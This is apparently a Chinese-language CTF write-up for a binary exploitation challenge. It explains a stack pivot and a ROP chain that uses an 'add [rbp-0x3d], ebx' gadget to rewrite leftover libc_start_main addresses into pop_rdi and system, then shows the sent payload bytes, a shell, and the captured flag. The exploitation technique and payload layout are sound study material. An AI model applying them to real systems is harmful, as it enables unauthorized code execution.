
# 思路
- 本题没有输出函数，无法泄漏libc地址， 无法修改stdin，stdout等参数
- 栈迁移，通常rop，直接跟上main或者read函数，此题中需要调用call_libc_start_main_ptr
- 在栈上留下若干libc的地址, 修改栈上面的指针构造rop链条


# debug

## 核心gadget
```
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```
把rbp设置成我们需要写的地址+0x3d，就可以往里面加上ebx的值，本题中libc_start_main的地址要修改成pop_rdi和system的地址，需要改2处，

两处之间用ret填充，最后栈上面值为
```
pop_rdi_ret             # 0x4046c0
/bin/sh adress
ret
ret
ret
...
system                  # 0x4047c0
```
![](https://r2.20161023.xyz/pic/20250710100816424.png)

### 三处libc_start_main+125的地址
```
pwndbg> find 0x404000, 0x404fff,  0x7fa2b898c07d
0x4046c0
0x4047c0
0x4048c0
3 patterns found.
```

## call libc_start_main_ptr
![](https://r2.20161023.xyz/pic/20250710095617812.png)

## 疑问
最后ret滑行的时候，read很多ret的时候，怎么有个00

![](https://r2.20161023.xyz/pic/20250709180031099.png)

# getshell
```
[DEBUG] Sent 0xf8 bytes:
    00000000  80 48 40 00  00 00 00 00  b2 10 40 00  00 00 00 00  │·H@·│····│··@·│····│
    00000010  b2 10 40 00  00 00 00 00  b2 10 40 00  00 00 00 00  │··@·│····│··@·│····│
    *
    000000f0  b2 10 40 00  00 00 00 00                            │··@·│····│
    000000f8
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x38 bytes:
    b'bbstack\n'
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'libx32\n'
    b'usr\n'
bbstack
bin
dev
flag
lib
lib32
lib64
libexec
libx32
usr
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x27 bytes:
    b'flag{ilkrSlIWLcOLfDJTT7qSnOjVhlim9ODr}\n'
flag{ilkrSlIWLcOLfDJTT7qSnOjVhlim9ODr}
$

```
![](https://r2.20161023.xyz/pic/20250708182043881.png)